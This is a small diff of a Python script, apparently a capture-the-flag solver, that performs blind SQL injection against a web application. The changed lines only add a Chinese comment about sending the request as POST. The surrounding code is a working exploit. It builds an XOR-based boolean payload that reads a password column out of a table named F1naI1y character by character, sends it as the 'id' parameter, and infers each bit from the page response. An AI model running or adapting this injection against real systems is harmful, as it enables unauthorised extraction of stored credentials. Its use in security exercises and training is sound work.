@@ -26,7 +26,7 @@ def payload(i, j):
     # 查询flag
     sql = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1" % (i, j)
     data = {"id": sql}
-    r = requests.get(url, params=data)
+    r = requests.get(url, params=data) #当发送post时，使用requests.post(url,data=data)
     # print (r.url)
     if "Click" in r.text:
        res = 1
